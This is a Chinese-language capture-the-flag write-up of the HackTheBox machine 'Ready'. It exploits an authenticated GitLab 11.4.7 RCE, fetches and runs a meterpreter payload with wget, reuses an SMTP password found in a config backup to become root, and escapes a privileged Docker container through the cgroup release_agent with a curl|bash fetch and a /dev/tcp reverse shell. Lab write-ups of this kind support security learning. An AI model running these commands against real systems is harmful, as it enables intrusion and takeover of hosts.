# 服务探测

开放端口
```
┌──(root㉿rock)-[~]
└─# nmap -p- --open 10.10.10.220              
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 04:24 EDT
Nmap scan report for 10.10.10.220
Host is up (0.030s latency).
Not shown: 61766 closed tcp ports (reset), 3767 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen

Nmap done: 1 IP address (1 host up) scanned in 50.09 seconds
```

详细端口信息
```

┌──(root㉿rock)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.220 -p 22,5080
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 04:26 EDT
Nmap scan report for 10.10.10.220
Host is up (0.092s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
|_http-title: GitLab is not responding (502)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 11 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   ... 10
11  12.36 ms 10.10.10.220

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds

```


# web

robots.txt
```
User-Agent: *
Disallow: /autocomplete/users
Disallow: /search
Disallow: /api
Disallow: /admin
Disallow: /profile
Disallow: /dashboard
Disallow: /projects/new
Disallow: /groups/new
Disallow: /groups/*/edit
Disallow: /users
Disallow: /help
# Only specifically allow the Sign In page to avoid very ugly search results
Allow: /users/sign_in

# Global snippets
User-Agent: *
Disallow: /s/
Disallow: /snippets/new
Disallow: /snippets/*/edit
Disallow: /snippets/*/raw

# Project details
User-Agent: *
Disallow: /*/*.git
Disallow: /*/*/fork/new
Disallow: /*/*/repository/archive*
Disallow: /*/*/activity
Disallow: /*/*/new
Disallow: /*/*/edit
Disallow: /*/*/raw
Disallow: /*/*/blame
Disallow: /*/*/commits/*/*
Disallow: /*/*/commit/*.patch
Disallow: /*/*/commit/*.diff
Disallow: /*/*/compare
Disallow: /*/*/branches/new
Disallow: /*/*/tags/new
Disallow: /*/*/network
Disallow: /*/*/graphs
Disallow: /*/*/milestones/new
Disallow: /*/*/milestones/*/edit
Disallow: /*/*/issues/new
Disallow: /*/*/issues/*/edit
Disallow: /*/*/merge_requests/new
Disallow: /*/*/merge_requests/*.patch
Disallow: /*/*/merge_requests/*.diff
Disallow: /*/*/merge_requests/*/edit
Disallow: /*/*/merge_requests/*/diffs
Disallow: /*/*/project_members/import
Disallow: /*/*/labels/new
Disallow: /*/*/labels/*/edit
Disallow: /*/*/wikis/*/edit
Disallow: /*/*/snippets/new
Disallow: /*/*/snippets/*/edit
Disallow: /*/*/snippets/*/raw
Disallow: /*/*/deploy_keys
Disallow: /*/*/hooks
Disallow: /*/*/services
Disallow: /*/*/protected_branches
Disallow: /*/*/uploads/

```

在这个页面确认gitlab版本为：11.4.7
```
http://10.10.10.220:5080/help
```

搜索漏洞情况，存在一个授权的RCE
```
┌──(root💀kali)-[~/htb/Ready]
└─# searchsploit gitlab 11.4.7
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GitLab 11.4.7 - RCE (Authenticated) (2)                                                                                                                                                                   | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)                                                                                                                                                 | ruby/webapps/49257.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


```


执行payload，但是没有返回rev shell
```
──(root💀kali)-[~/htb/Ready]
└─# python3 49334.py -u chen -p 123456789 -g 'http://10.10.10.220' -l 10.10.16.2 -P 5080
[+] authenticity_token: P6oayybySIHkjN1hOiORE2To2qUsij2zCCWcEwRjr/eJ/UnDoWxn4YF5ZWw9aRBAUenpEHf0nkcnXQAZfSnCew==
[+] Creating project with random name: project2006
[+] Running Exploit
[+] Exploit completed successfully!

```

查看exp源代码，发现用的是nc反弹的shell
```
f'nc {local_ip} {local_port} -e /bin/bash'
```

linux为了安全考虑，一般会禁用nc的-e和-c参数

我们首先要证明确实是存在RCE，然后再想其他办法反弹shell回来

我们把上面那行代码改为：
```
 f'wget http://10.10.16.2/any'
```

在kali本地开一个http服务器，然后执行exp，收到get请求，证明rce存在
```
┌──(root💀kali)-[~/htb/Ready]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.220 - - [01/Jul/2022 05:22:07] code 404, message File not found
10.10.10.220 - - [01/Jul/2022 05:22:07] "GET /any HTTP/1.1" 404 -

```

# foothold

编译一个exp
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4242 -f elf > shell.elf
```

起一个http服务
```
┌──(root💀kali)-[~/htb/Ready]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

上面49334.py的payload改为

```
wget http://10.10.16.2/shell.elf -O /tmp/shell.elf&&chmod 777 /tmp/shell.elf&&/tmp/shell.elf
```

如果上面payload执行不了尝试分三次执行


触发攻击
```
┌──(root💀kali)-[~/htb/Ready]
└─# python3 49334.py -u chen -p 123456789 -g 'http://10.10.10.220' -l 10.10.16.2 -P 5080
[+] authenticity_token: 8IMetc2Ptcb5HXlnRVYTK3YdOhCdLQ39XTrwO2FOjxHBAF+SJbzuwNYB9udD2jQnC1Tlg5oNRNczOisNZa3Aog==
[+] Creating project with random name: project4047
[+] Running Exploit
[+] Exploit completed successfully!
```

拿到user.txt
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.2:4242 
[*] Sending stage (989032 bytes) to 10.10.10.220
[*] Meterpreter session 4 opened (10.10.16.2:4242 -> 10.10.10.220:42282) at 2022-07-18 02:55:05 -0400

meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2022-04-05 08:32:28 -0400  dude

meterpreter > cd dude
meterpreter > ls
Listing: /home/dude
===================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100551/r-xr-x--x  33    fil   2022-07-18 02:21:48 -0400  user.txt

meterpreter > cat user.txt 
176f5155e3df....
```

# 提权

使用```/bin/bash -i```提升到tty

在```/opt```目录找到一个```backup```文件夹，```/opt```目录通常不会有任何文件，因此这里的文件信息要多注意，常常是提权的关键

在gitlab.rb里找到一个密码
```
git@gitlab:/opt/backup$ cat gitlab.rb|grep pass
cat gitlab.rb|grep pass
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil

```

留意这一行
```
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

尝试提权，提示只能在terminal下执行su命令
```
git@gitlab:/tmp$ su root
su root
su: must be run from a terminal
git@gitlab:/tmp$ 

```

我们需要提升一个完整的终端


## 提升完整shell

(这里其实是我打OSCPlab学到的方法。。)

参考这里的[方法](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)


靶机如果没有socat，到这里下载二进制文件：https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat


kali:
```
socat file:`tty`,raw,echo=0 tcp-listen:443
```

靶机
```
./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.119.187:443
```

现在我们收到一个完整的shell，可以执行```su```命令
```
┌──(root💀kali)-[~/htb/Ready]
└─# socat file:`tty`,raw,echo=0 tcp-listen:443
git@gitlab:/tmp$ su
Password: 
root@gitlab:/tmp# whoami
root
root@gitlab:~# id
uid=0(root) gid=0(root) groups=0(root)
root@gitlab:~# 

```

但是没有发现root.txt，因为我们在一个容器内

## docker逃逸

查看```docker-compose.yml```,这个是docker的配置文件

```
root@gitlab:/opt/backup# cat docker-compose.yml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
      - '/opt/user:/home/dude/'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16

```

```privileged: true```表示容器在主机上也有root权限

参考[这篇文章](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)里的方法，我们可以实现docker逃逸，获取主机的一个root shell

```
root@gitlab:~# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
root@gitlab:~# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
root@gitlab:~# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@gitlab:~# echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.16.2/shell.sh | bash' >/c;
root@gitlab:~# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
```

shell.sh
```
bash >& /dev/tcp/10.10.16.2/4242 0>&1
```

收到反弹shell
```
┌──(root💀kali)-[~]
└─# nc -lnvp 4242                                                                                               1 ⨯
listening on [any] 4242 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.220] 46706
id
uid=0(root) gid=0(root) groups=0(root)
whoami  
root
ls /root
docker-gitlab
ready-channel
root.txt
snap
cat root.txt
ffa185f28f07941...

```